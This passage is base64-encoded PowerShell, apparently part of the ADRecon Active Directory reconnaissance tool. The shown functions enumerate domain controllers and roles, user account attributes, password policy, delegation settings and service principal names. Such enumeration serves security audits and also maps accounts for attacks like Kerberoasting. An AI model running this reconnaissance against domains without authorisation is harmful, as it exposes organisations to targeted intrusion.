1ZSAkXy5Ib3N0TmFtZQogICAgICAgICAgICAgICAgSWYgKCRfLk9wZXJhdGlvbk1hc3RlclJvbGVzIC1saWtlICdEb21haW5OYW1pbmdNYXN0ZXInKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtaW5nIiAtVmFsdWUgJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIk5hbWluZyIgLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgSWYgKCRfLk9wZXJhdGlvbk1hc3RlclJvbGVzIC1saWtlICdTY2hlbWFNYXN0ZXInKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2NoZW1hIiAtVmFsdWUgJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlNjaGVtYSIgLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgSWYgKCRfLk9wZXJhdGlvbk1hc3RlclJvbGVzIC1saWtlICdJbmZyYXN0cnVjdHVyZU1hc3RlcicpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJJbmZyYSIgLVZhbHVlICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJJbmZyYSIgLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgSWYgKCRfLk9wZXJhdGlvbk1hc3RlclJvbGVzIC1saWtlICdSSURNYXN0ZXInKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUklEIiAtVmFsdWUgJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlJJRCIgLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgSWYgKCRfLk9wZXJhdGlvbk1hc3RlclJvbGVzIC1saWtlICdQRENFbXVsYXRvcicpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQREMiIC1WYWx1ZSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUERDIiAtVmFsdWUgJGZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkRENTTUJPYmogPSBbQURSZWNvbi5QaW5nQ2FzdGxlU2Nhbm5lcnNTTUJTY2FubmVyXTo6R2V0UFNPYmplY3QoJF8uSVB2NEFkZHJlc3MpCiAgICAgICAgICAgICAgICBGb3JFYWNoICgkUHJvcGVydHkgaW4gJERDU01CT2JqLnBzb2JqZWN0LlByb3BlcnRpZXMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRQcm9wZXJ0eS5OYW1lIC1WYWx1ZSAkUHJvcGVydHkudmFsdWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICREQ09iaiArPSAkT2JqCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERG9tYWluQ29udHJvbGxlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICB7CiAgICAgICAgICAgICREb21haW5GUUROID0gR2V0LUROdG9GUUROKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpCiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoIkRvbWFpbiIsJCgkRG9tYWluRlFETiksJCgkQ3JlZGVudGlhbC5Vc2VyTmFtZSksJCgkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnBhc3N3b3JkKSkKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkRvbWFpbkNvbnRyb2xsZXJdIEVycm9yIGdldHRpbmcgRG9tYWluIENvbnRleHQiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBEb21haW5Db250ZXh0CiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKQogICAgICAgIH0KCiAgICAgICAgSWYgKCRBRERvbWFpbi5Eb21haW5Db250cm9sbGVycykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBEb21haW4gQ29udHJvbGxlcnM6ICQoW0FEUmVjb24uTERBUENsYXNzXTo6T2JqZWN0Q291bnQoJEFERG9tYWluLkRvbWFpbkNvbnRyb2xsZXJzKSkiCiAgICAgICAgICAgICMgREMgSW5mbwogICAgICAgICAgICAkRENPYmogPSBAKCkKICAgICAgICAgICAgJEFERG9tYWluLkRvbWFpbkNvbnRyb2xsZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgIyBDcmVhdGUgdGhlIG9iamVjdCBmb3IgZWFjaCBpbnN0YW5jZS4KICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkRvbWFpbiIgLVZhbHVlICRfLkRvbWFpbgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJTaXRlIiAtVmFsdWUgJF8uU2l0ZU5hbWUKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtZSIgLVZhbHVlICgkXy5OYW1lIC1TcGxpdCAoIlwuIikpWzBdCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIklQQWRkcmVzcyIgLVZhbHVlICRfLklQQWRkcmVzcwogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJPcGVyYXRpbmcgU3lzdGVtIiAtVmFsdWUgJF8uT1NWZXJzaW9uCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkhvc3RuYW1lIiAtVmFsdWUgJF8uTmFtZQogICAgICAgICAgICAgICAgSWYgKCRudWxsIC1uZSAkXy5Sb2xlcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIk5hbWluZyIgLVZhbHVlICQoJF8uUm9sZXMuQ29udGFpbnMoIk5hbWluZ1JvbGUiKSkKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlNjaGVtYSIgLVZhbHVlICQoJF8uUm9sZXMuQ29udGFpbnMoIlNjaGVtYVJvbGUiKSkKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkluZnJhIiAtVmFsdWUgJCgkXy5Sb2xlcy5Db250YWlucygiSW5mcmFzdHJ1Y3R1cmVSb2xlIikpCiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJSSUQiIC1WYWx1ZSAkKCRfLlJvbGVzLkNvbnRhaW5zKCJSaWRSb2xlIikpCiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQREMiIC1WYWx1ZSAkKCRfLlJvbGVzLkNvbnRhaW5zKCJQZGNSb2xlIikpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICJOYW1pbmciLCAiU2NoZW1hIiwgIkluZnJhIiwgIlJJRCIsICJQREMiIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJF8gLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICREQ1NNQk9iaiA9IFtBRFJlY29uLlBpbmdDYXN0bGVTY2FubmVyc1NNQlNjYW5uZXJdOjpHZXRQU09iamVjdCgkXy5JUEFkZHJlc3MpCiAgICAgICAgICAgICAgICBGb3JFYWNoICgkUHJvcGVydHkgaW4gJERDU01CT2JqLnBzb2JqZWN0LlByb3BlcnRpZXMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRQcm9wZXJ0eS5OYW1lIC1WYWx1ZSAkUHJvcGVydHkudmFsdWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICREQ09iaiArPSAkT2JqCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERG9tYWluCiAgICAgICAgfQogICAgfQoKICAgIElmICgkRENPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICREQ09iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSVXNlcgp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyBhbGwgdXNlcnMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCB1c2VycyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBkYXRlCiAgICBbRGF0ZVRpbWVdCiAgICBEYXRlIHdoZW4gQURSZWNvbiB3YXMgZXhlY3V0ZWQuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIERvcm1hbnRUaW1lU3BhbgogICAgW2ludF0KICAgIFRpbWVzcGFuIGZvciBEb3JtYW50IGFjY291bnRzLiBEZWZhdWx0IDkwIGRheXMuCgouUEFSQU1FVEVSIFBhZ2VTaXplCiAgICBbaW50XQogICAgVGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LiBEZWZhdWx0IDIwMC4KCi5QQVJBTUVURVIgVGhyZWFkcwogICAgW2ludF0KICAgIFRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZHVyaW5nIHByb2Nlc3Npbmcgb2Ygb2JqZWN0cy4gRGVmYXVsdCAxMC4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0RhdGVUaW1lXSAkZGF0ZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJERvcm1hbnRUaW1lU3BhbiA9IDkwLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEVXNlcnMgPSBAKCBHZXQtQURVc2VyIC1GaWx0ZXIgKiAtUmVzdWx0UGFnZVNpemUgJFBhZ2VTaXplIC1Qcm9wZXJ0aWVzIEFjY291bnRFeHBpcmF0aW9uRGF0ZSxhY2NvdW50RXhwaXJlcyxBY2NvdW50Tm90RGVsZWdhdGVkLEFkbWluQ291bnQsQWxsb3dSZXZlcnNpYmxlUGFzc3dvcmRFbmNyeXB0aW9uLGMsQ2Fubm90Q2hhbmdlUGFzc3dvcmQsQ2Fub25pY2FsTmFtZSxDb21wYW55LERlcGFydG1lbnQsRGVzY3JpcHRpb24sRGlzdGluZ3Vpc2hlZE5hbWUsRG9lc05vdFJlcXVpcmVQcmVBdXRoLEVuYWJsZWQsZ2l2ZW5OYW1lLGhvbWVEaXJlY3RvcnksSW5mbyxMYXN0TG9nb25EYXRlLGxhc3RMb2dvblRpbWVzdGFtcCxMb2NrZWRPdXQsTG9nb25Xb3Jrc3RhdGlvbnMsbWFpbCxNYW5hZ2VyLG1pZGRsZU5hbWUsbW9iaWxlLCdtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8nLCdtc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlcycsTmFtZSxQYXNzd29yZEV4cGlyZWQsUGFzc3dvcmRMYXN0U2V0LFBhc3N3b3JkTmV2ZXJFeHBpcmVzLFBhc3N3b3JkTm90UmVxdWlyZWQscHJpbWFyeUdyb3VwSUQscHJvZmlsZVBhdGgscHdkbGFzdHNldCxTYW1BY2NvdW50TmFtZSxTY3JpcHRQYXRoLFNJRCxTSURIaXN0b3J5LFNtYXJ0Y2FyZExvZ29uUmVxdWlyZWQsc24sVGl0bGUsVHJ1c3RlZEZvckRlbGVnYXRpb24sVHJ1c3RlZFRvQXV0aEZvckRlbGVnYXRpb24sVXNlREVTS2V5T25seSxVc2VyQWNjb3VudENvbnRyb2wsd2hlbkNoYW5nZWQsd2hlbkNyZWF0ZWQgKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJVc2VyXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBVc2VyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURVc2VycykKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQURwYXNzcG9saWN5ID0gR2V0LUFERGVmYXVsdERvbWFpblBhc3N3b3JkUG9saWN5CiAgICAgICAgICAgICAgICAkUGFzc01heEFnZSA9ICRBRHBhc3Nwb2xpY3kuTWF4UGFzc3dvcmRBZ2UuZGF5cwogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEcGFzc3BvbGljeQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSVXNlcl0gRXJyb3IgcmV0cmlldmluZyBNYXggUGFzc3dvcmQgQWdlIGZyb20gdGhlIERlZmF1bHQgUGFzc3dvcmQgUG9saWN5LiBVc2luZyB2YWx1ZSBhcyA5MCBkYXlzIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAkUGFzc01heEFnZSA9IDkwCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBVc2VyczogJChbQURSZWNvbi5BRFdTQ2xhc3NdOjpPYmplY3RDb3VudCgkQURVc2VycykpIgogICAgICAgICAgICAkVXNlck9iaiA9IFtBRFJlY29uLkFEV1NDbGFzc106OlVzZXJQYXJzZXIoJEFEVXNlcnMsICRkYXRlLCAkRG9ybWFudFRpbWVTcGFuLCAkUGFzc01heEFnZSwgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFVzZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSIKICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvc3lzdGVtLmRpcmVjdG9yeXNlcnZpY2VzLnNlY3VyaXR5bWFza3Modj12cy4xMTApLmFzcHgKICAgICAgICAkT2JqU2VhcmNoZXIuU2VjdXJpdHlNYXNrcyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc10nRGFjbCcKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImFjY291bnRFeHBpcmVzIiwiYWRtaW5jb3VudCIsImMiLCJjYW5vbmljYWxuYW1lIiwiY29tcGFueSIsImRlcGFydG1lbnQiLCJkZXNjcmlwdGlvbiIsImRpc3Rpbmd1aXNoZWRuYW1lIiwiZ2l2ZW5OYW1lIiwiaG9tZWRpcmVjdG9yeSIsImluZm8iLCJsYXN0TG9nb250aW1lc3RhbXAiLCJtYWlsIiwibWFuYWdlciIsIm1pZGRsZU5hbWUiLCJtb2JpbGUiLCJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iLCJtc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlcyIsIm5hbWUiLCJudHNlY3VyaXR5ZGVzY3JpcHRvciIsIm9iamVjdHNpZCIsInByaW1hcnlncm91cGlkIiwicHJvZmlsZXBhdGgiLCJwd2RMYXN0U2V0Iiwic2FtYWNjb3VudE5hbWUiLCJzY3JpcHRwYXRoIiwic2lkaGlzdG9yeSIsInNuIiwidGl0bGUiLCJ1c2VyYWNjb3VudGNvbnRyb2wiLCJ1c2Vyd29ya3N0YXRpb25zIiwid2hlbmNoYW5nZWQiLCJ3aGVuY3JlYXRlZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEVXNlcnMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlVzZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFVzZXIgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAkT2JqU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgIElmICgkQURVc2VycykKICAgICAgICB7CiAgICAgICAgICAgICRQYXNzTWF4QWdlID0gJCgkT2JqRG9tYWluLkNvbnZlcnRMYXJnZUludGVnZXJUb0ludDY0KCRPYmpEb21haW4ubWF4cHdkYWdlLnZhbHVlKSAvLTg2NDAwMDAwMDAwMCkKICAgICAgICAgICAgSWYgKC1Ob3QgJFBhc3NNYXhBZ2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSVXNlcl0gRXJyb3IgcmV0cmlldmluZyBNYXggUGFzc3dvcmQgQWdlIGZyb20gdGhlIERlZmF1bHQgUGFzc3dvcmQgUG9saWN5LiBVc2luZyB2YWx1ZSBhcyA5MCBkYXlzIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAkUGFzc01heEFnZSA9IDkwCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBVc2VyczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURVc2VycykpIgogICAgICAgICAgICAkVXNlck9iaiA9IFtBRFJlY29uLkxEQVBDbGFzc106OlVzZXJQYXJzZXIoJEFEVXNlcnMsICRkYXRlLCAkRG9ybWFudFRpbWVTcGFuLCAkUGFzc01heEFnZSwgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFVzZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkVXNlck9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJFVzZXJPYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUlVzZXJTUE4Kewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIHVzZXIgc2VydmljZSBwcmluY2lwYWwgbmFtZSAoU1BOKSBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIHVzZXIgc2VydmljZSBwcmluY2lwYWwgbmFtZSAoU1BOKSBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBvYmpEb21haW4KICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIERvbWFpbiBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLlBBUkFNRVRFUiBQYWdlU2l6ZQogICAgW2ludF0KICAgIFRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4gRGVmYXVsdCAyMDAuCgouUEFSQU1FVEVSIFRocmVhZHMKICAgIFtpbnRdCiAgICBUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGR1cmluZyBwcm9jZXNzaW5nIG9mIG9iamVjdHMuIERlZmF1bHQgMTAuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRQYWdlU2l6ZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtpbnRdICRUaHJlYWRzID0gMTAKICAgICkKCiAgICBJZiAoJFByb3RvY29sIC1lcSAnQURXUycpCiAgICB7CiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURVc2VycyA9IEAoIEdldC1BRE9iamVjdCAtTERBUEZpbHRlciAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKSkiIC1Qcm9wZXJ0aWVzIE5hbWUsRGVzY3JpcHRpb24sbWVtYmVyT2Ysc0FNQWNjb3VudE5hbWUsc2VydmljZVByaW5jaXBhbE5hbWUscHJpbWFyeUdyb3VwSUQscHdkTGFzdFNldCx1c2VyQWNjb3VudENvbnRyb2wgLVJlc3VsdFBhZ2VTaXplICRQYWdlU2l6ZSApCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlVzZXJTUE5dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFVzZXJTUE4gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBRFVzZXJzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIFVzZXJTUE5zOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRFVzZXJzKSkiCiAgICAgICAgICAgICRVc2VyU1BOT2JqID0gW0FEUmVjb24uQURXU0NsYXNzXTo6VXNlclNQTlBhcnNlcigkQURVc2VycywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFVzZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREF